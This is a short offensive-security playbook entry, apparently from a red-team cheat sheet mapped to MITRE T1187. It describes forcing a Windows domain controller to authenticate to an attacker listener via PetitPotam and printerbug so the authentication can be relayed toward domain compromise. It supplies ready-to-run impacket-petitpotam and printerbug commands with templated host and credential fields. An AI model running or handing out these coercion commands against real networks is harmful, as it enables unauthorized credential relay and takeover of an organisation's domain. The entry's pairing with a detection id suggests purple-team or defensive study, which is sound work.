---
id: coerce-petitpotam
title: Coerce DC auth (PetitPotam / printerbug)
section: Coercion -> relay -> domain compromise
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1187]
platform: [windows, network]
source: hacktheplanet §"Coercion -> relay -> domain compromise"
pair: coercion-5145
---

Force a machine — ideally a DC — to authenticate to a host you control, then
relay that auth (see `ntlm-relay-ntlmrelayx`). PetitPotam abuses MS-EFSRPC,
printerbug the MS-RPRN spooler; `coercer` sprays many vectors at once. Here
`{{rhost}}` is the DC being coerced and `{{lhost}}` is your listener.

```sh
impacket-petitpotam {{lhost}} {{rhost}}
printerbug {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
```
